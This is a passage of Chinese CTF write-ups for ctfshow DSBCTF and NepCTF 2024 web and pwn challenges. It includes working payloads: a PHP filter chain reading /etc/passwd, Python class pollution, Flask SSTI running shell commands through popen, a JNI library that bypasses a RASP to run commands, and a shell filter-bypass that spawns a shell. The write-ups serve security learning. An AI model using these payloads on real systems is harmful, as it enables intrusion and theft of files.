<span class="string">&quot;convert.base64-encode|&quot;</span>;</span><br><span class="line">    <span class="variable">$filters</span> .= <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$filters</span> .= <span class="string">&quot;convert.base64-decode&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$final_payload</span> = <span class="string">&quot;php://filter/<span class="subst">&#123;$filters&#125;</span>/resource=/etc/passwd&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$final_payload</span>);</span><br></pre></td></tr></table></figure><p>exp：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;name&quot;:&quot;guest&quot;,&quot;__template_path__&quot;:&quot;php://filter/convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/etc/passwd&quot;&#125;</span><br></pre></td></tr></table></figure><p><img src="/ctfshow_DSBCTF_%E5%8D%95%E8%BA%AB%E6%9D%AF/image-20241113150444013.png" alt="image-20241113150444013"></p><h2 id="ez-inject"><a href="#ez-inject" class="headerlink" title="ez_inject"></a>ez_inject</h2><p>扫目录，可以发现还有一个 <code>/chat</code> 路由</p><p><img src="/ctfshow_DSBCTF_%E5%8D%95%E8%BA%AB%E6%9D%AF/image-20241113151036631.png" alt="image-20241113151036631"></p><p>根据提示，猜测在注册路由存在原型链污染</p><p>这里使用了非预期做法，污染<code>_static_folder</code>为<code>/</code>，即可实现任意文件读取，最后访问<code>/static/flag</code>得到flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;1231b&quot;,&quot;password&quot;:&quot;aaaa&quot;,&quot;__init__&quot; : &#123;&quot;__globals__&quot; : &#123;&quot;app&quot; : &#123;&quot;_static_folder&quot; : &quot;/&quot;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/ctfshow_DSBCTF_%E5%8D%95%E8%BA%AB%E6%9D%AF/image-20241113151430215.png" alt="image-20241113151430215"></p><h2 id="ezzz-ssti"><a href="#ezzz-ssti" class="headerlink" title="ezzz_ssti"></a>ezzz_ssti</h2><p>ssti，限制了长度，但没有什么过滤，可以用<code>config.update</code>来绕过</p><p>参考链接：<a href="https://blog.csdn.net/weixin_43995419/article/details/126811287">Python Flask SSTI 之 长度限制绕过</a></p><p>原先要执行的payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__.os.popen(&#x27;whoami&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>将他们分段放进<code>config</code>里即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;config.update(u=url_for.__globals__)&#125;&#125;</span><br><span class="line">&#123;&#123;config.update(u=config.u.os.popen)&#125;&#125;</span><br><span class="line">&#123;&#123;config.u(&quot;cat /f*&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/ctfshow_DSBCTF_%E5%8D%95%E8%BA%AB%E6%9D%AF/image-20241113151850007.png" alt="image-20241113151850007"></p><h2 id="简单的文件上传"><a href="#简单的文件上传" class="headerlink" title="简单的文件上传"></a>简单的文件上传</h2><p>能执行jar包，但不能直接读写和执行命令，后边经过测试，可以用 <code>JNI</code> 加载外部<code>so</code>文件来绕过</p><p>参考链接：<a href="https://dummykitty.github.io/java/2023/06/15/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87-RASP.html#%E9%80%9A%E8%BF%87-jni-%E7%BB%95%E8%BF%87-rasp"><strong>Java 反序列化绕过 RASP</strong></a></p><p>照着参考链接复现</p><p>编写 native 方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NativeLibraryExample</span> &#123;</span><br><span class="line">    <span class="comment">// 声明native方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">nativeMethod</span><span class="params">(String cmd)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">NativeLibraryExample</span> <span class="variable">example</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NativeLibraryExample</span>();</span><br><span class="line"></span><br><span class="line">        example.nativeMethod(<span class="string">&quot;mate-calc&quot;</span>); <span class="comment">// 调用native方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生成头文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javac NativeLibraryExample.java</span><br><span class="line"></span><br><span class="line">javah -jni NativeLibraryExample</span><br></pre></td></tr></table></figure><p>c代码：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;jni.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;NativeLibraryExample.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">execmd</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *cmd, <span class="type">char</span> *result)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">1024</span>*<span class="number">12</span>];              <span class="comment">//定义缓冲区</span></span><br><span class="line">    FILE *pipe = popen(cmd, <span class="string">&quot;r&quot;</span>); <span class="comment">//打开管道，并执行命令</span></span><br><span class="line">    <span class="keyword">if</span> (!pipe)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">//返回0表示运行失败</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!feof(pipe))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (fgets(buffer, <span class="keyword">sizeof</span>(buffer), pipe))</span><br><span class="line">        &#123; <span class="comment">//将管道输出到result中</span></span><br><span class="line">            <span class="built_in">strcat</span>(result, buffer);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    pclose(pipe); <span class="comment">//关闭管道</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;      <span class="comment">//返回1表示运行成功</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">JNIEXPORT <span class="type">void</span> JNICALL <span class="title function_">Java_NativeLibraryExample_nativeMethod</span><span class="params">(JNIEnv *env, jobject obj, jstring jstr)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *cstr = (*env)-&gt;GetStringUTFChars(env, jstr, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="type">char</span> result[<span class="number">1024</span> * <span class="number">12</span>] = <span class="string">&quot;&quot;</span>; <span class="comment">//定义存放结果的字符串数组</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">1</span> == execmd(cstr, result))</span><br><span class="line">    &#123;</span><br><span class="line">       <span class="comment">// printf(result);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> return_messge[<span class="number">100</span>] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="built_in">strcat</span>(return_messge, result);</span><br><span class="line">    jstring cmdresult = (*env)-&gt;NewStringUTF(env, return_messge);</span><br><span class="line">    <span class="comment">//system();</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cmdresult;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译<code>so</code>文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -fPIC -I&quot;$JAVA_HOME/include&quot; -I&quot;$JAVA_HOME/include/linux&quot; -shared -o libcmd.so JniClass.c</span><br><span class="line"></span><br><span class="line">gcc -fPIC -I&quot;/home/ctfer/Desktop/awdp/2/jdk1.8.0_65/include</span><br><span class="line">/include&quot; -I&quot;/home/ctfer/Desktop/awdp/2/jdk1.8.0_65/include/linux&quot; -shared -o libcmd.so a.c</span><br></pre></td></tr></table></figure><p>里面的<code>$JAVA_HOME</code> 换成自己java所在的目录</p><p>接着将so文件改名，改成.jar后缀，然后上传</p><p>接着就加载so文件执行命令</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">nativeMethod</span><span class="params">(String cmd)</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.load(<span class="string">&quot;/var/www/html/uploads/libcmd.so.jar&quot;</span>);</span><br><span class="line">        <span class="type">NativeLibraryExample</span> <span class="variable">example</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NativeLibraryExample</span>();</span><br><span class="line"></span><br><span class="line">        example.nativeMethod(<span class="string">&quot;cat /secretFlag000.txt &gt; /var/www/html/uploads/1.txt&quot;</span>); <span class="comment">// 调用native方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上传jar包执行，访问<code>uploads/1.txt</code>得到flag</p><p><img src="/ctfshow_DSBCTF_%E5%8D%95%E8%BA%AB%E6%9D%AF/image-20241113160016493.png" alt="image-20241113160016493"></p><p><img src="/ctfshow_DSBCTF_%E5%8D%95%E8%BA%AB%E6%9D%AF/image-20241113160029829.png" alt="image-20241113160029829"></p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="Findyourgirlfriend"><a href="#Findyourgirlfriend" class="headerlink" title="Findyourgirlfriend"></a>Findyourgirlfriend</h2><p><img src="/ctfshow_DSBCTF_%E5%8D%95%E8%BA%AB%E6%9D%AF/image-20241113160237586.png" alt="image-20241113160237586"></p><p>过滤了以下东西</p><p><img src="/ctfshow_DSBCTF_%E5%8D%95%E8%BA%AB%E6%9D%AF/image-20241113160300985.png" alt="image-20241113160300985"></p><p>关键字可以在中间插入<code>&#39;&#39;</code>绕过，用<code>read</code>给<code>PATH</code>重新赋值，即可再次执行<code>sh</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">read PA&#x27;&#x27;TH;s&#x27;&#x27;h</span><br></pre></td></tr></table></figure><p>接着输入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/bin</span><br></pre></td></tr></table></figure><p>即可得到shell</p><p><img src="/ctfshow_DSBCTF_%E5%8D%95%E8%BA%AB%E6%9D%AF/image-20241113160616367.png" alt="image-20241113160616367"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 比赛 </category>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write up </tag>
            
            <tag> WEB </tag>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NepCTF 2024</title>
      <link href="/NepCTF_2024/"/>
      <url>/NepCTF_2024/</url>
      
        <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="NepDouble"><a href="#NepDouble" class="headerlink" title="NepDouble"></a>NepDouble</h2><p>源码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request,render_template,render_template_string</span><br><span class="line"><span class="keyword">from</span> zipfile <span class="keyword">import</span> ZipFile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Environment, FileSystemLoader</span><br><span class="line"></span><br><span class="line">app = Flask(__name__,template_folder=<span class="string">&#x27;static&#x27;</span>)</span><br><span class="line">app.config[<span class="string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = <span class="number">1</span> * <span class="number">1024</span> * <span class="number">1024</span></span><br><span class="line"></span><br><span class="line">UPLOAD_FOLDER = <span class="string">&#x27;/app/uploads&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = UPLOAD_FOLDER</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(UPLOAD_FOLDER):</span><br><span class="line">    os.makedirs(UPLOAD_FOLDER)</span><br><span class="line"></span><br><span class="line">template_env = Environment(loader=FileSystemLoader(<span class="string">&#x27;static&#x27;</span>), autoescape=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render_template</span>(<span class="params">template_name, **context</span>):</span><br><span class="line">    template = template_env.get_template(template_name)</span><br><span class="line">    <span class="keyword">return</span> template.render(**context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render_template_string</span>(<span class="params">template_string, **context</span>):</span><br><span class="line">    template = template_env.from_string(template_string)</span><br><span class="line">    <span class="keyword">return</span> template.render(**context)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method != <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Please use POST method to upload files.&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        clear_uploads_folder()</span><br><span class="line">        files = request.files.get(<span class="string">&#x27;tp_file&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> files:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;No file uploaded.&#x27;</span></span><br><span class="line"></span><br><span class="line">        file_size = <span class="built_in">len</span>(files.read())</span><br><span class="line">        files.seek(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        file_extension = files.filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[-<span class="number">1</span>].lower()</span><br><span class="line">        <span class="keyword">if</span> file_extension != <span class="string">&#x27;zip&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid file type. Please upload a .zip file.&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        timestamp = datetime.datetime.now().strftime(<span class="string">&#x27;%Y%m%d%H%M%S&#x27;</span>)</span><br><span class="line">        md5_dir_name = hashlib.md5(timestamp.encode()).hexdigest()</span><br><span class="line">        unzip_folder = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], md5_dir_name)</span><br><span class="line">        os.makedirs(unzip_folder, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> ZipFile(files) <span class="keyword">as</span> zip_file:</span><br><span class="line">            zip_file.extractall(path=unzip_folder)</span><br><span class="line"></span><br><span class="line">        files_list = []</span><br><span class="line">        <span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(unzip_folder):</span><br><span class="line">            <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">                <span class="built_in">print</span>(file)</span><br><span class="line">                file_path = os.path.join(root, file)</span><br><span class="line">                relative_path = os.path.relpath(file_path, app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>])</span><br><span class="line">                link = <span class="string">f&#x27;&lt;a href=&quot;/cat?file=<span class="subst">&#123;relative_path&#125;</span>&quot;&gt;<span class="subst">&#123;file&#125;</span>&lt;/a&gt;&#x27;</span></span><br><span class="line">                files_list.append(link)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> render_template_string(<span class="string">&#x27;&lt;br&gt;&#x27;</span>.join(files_list))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Invalid filename.&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;An error occurred. Please check your file and try again.&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/cat&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cat</span>():</span><br><span class="line">    file_path = request.args.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> file_path:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;File path is missing.&#x27;</span></span><br><span class="line"></span><br><span class="line">    new_file = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], file_path)</span><br><span class="line">    <span class="keyword">if</span> os.path.commonprefix([os.path.abspath(new_file), os.path.abspath(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>])]) != os.path.abspath(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>]):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Invalid file path.&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> os.path.islink(new_file):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Symbolic links are not allowed.&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        filename = file_path.split(<span class="string">&#x27;/&#x27;</span>)[-<span class="number">1</span>]</span><br><span class="line">        content = read_large_file(new_file)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;test.html&#x27;</span>,content=content,filename=filename,dates=Exec_date())</span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;File not found.&#x27;</span></span><br><span class="line">    <span class="keyword">except</span> IOError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;Error reading file: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Exec_date</span>():</span><br><span class="line">    d_res = os.popen(<span class="string">&#x27;date&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">return</span> d_res.split(<span class="string">&quot; &quot;</span>)[-<span class="number">1</span>].strip()+<span class="string">&quot; &quot;</span>+d_res.split(<span class="string">&quot; &quot;</span>)[-<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clear_uploads_folder</span>():</span><br><span class="line">    <span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], topdown=<span class="literal">False</span>):</span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">            os.remove(os.path.join(root, file))</span><br><span class="line">        <span class="keyword">for</span> <span class="built_in">dir</span> <span class="keyword">in</span> dirs:</span><br><span class="line">            os.rmdir(os.path.join(root, <span class="built_in">dir</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_large_file</span>(<span class="params">file_path</span>):</span><br><span class="line">    content = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> file:</span><br><span class="line">            content += line</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="string">&quot;8000&quot;</span>,debug=<span class="literal">False</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>审计源码，可以发现这一句话</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> render_template_string(<span class="string">&#x27;&lt;br&gt;&#x27;</span>.join(files_list))</span><br></pre></td></tr></table></figure><p>这里的<code>file_list</code>是上传的压缩包里的文件名，是可控的，因此可以利用这个来ssti，没有过滤</p><p>创建文件，文件名是payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;cd ..;cat flag&#x27;).read()&#125;&#125;.txt</span><br></pre></td></tr></table></figure><p>然后将它压缩成zip，接着上传，上传成功后，即可得到flag。</p><p><img src="/NepCTF_2024/image-20240824162455019.png" alt="image-20240824162455019"></p><p>上传需要自己写一个上传表单</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-CN&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>文件上传表单<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>文件上传表单<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://neptune-14493.nepctf.lemonprefect.cn/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span 